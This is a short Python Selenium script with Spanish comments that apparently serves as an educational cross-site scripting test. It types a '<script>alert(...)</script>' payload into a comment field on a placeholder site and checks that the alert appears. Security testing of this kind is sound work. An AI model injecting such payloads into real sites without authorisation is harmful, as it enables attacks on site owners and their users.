from selenium import webdriver

# URL de la página con el campo de comentarios
url_comentarios = "https://www.ejemplo.com/comentarios"

# Script malicioso para el ataque XSS (¡solo con fines educativos!)
script_xss = "<script>alert('¡don't hack ur mother!');</script>"

# Inicializa el controlador del navegador (en este caso, Firefox)
driver = webdriver.Firefox()

try:
    # Abre la página de comentarios
    driver.get(url_comentarios)

    # Completa el campo de comentarios con el script XSS
    driver.find_element_by_id("campo-comentarios").send_keys(script_xss)
    driver.find_element_by_id("btn-enviar").click()

    # Verifica que la alerta del script malicioso aparezca (ajusta según tu caso)
    alert = driver.switch_to.alert
    assert "¡don't hack ur mother!" in alert.text
    alert.accept()

finally:
    # Cierra el navegador al finalizar
    driver.quit()
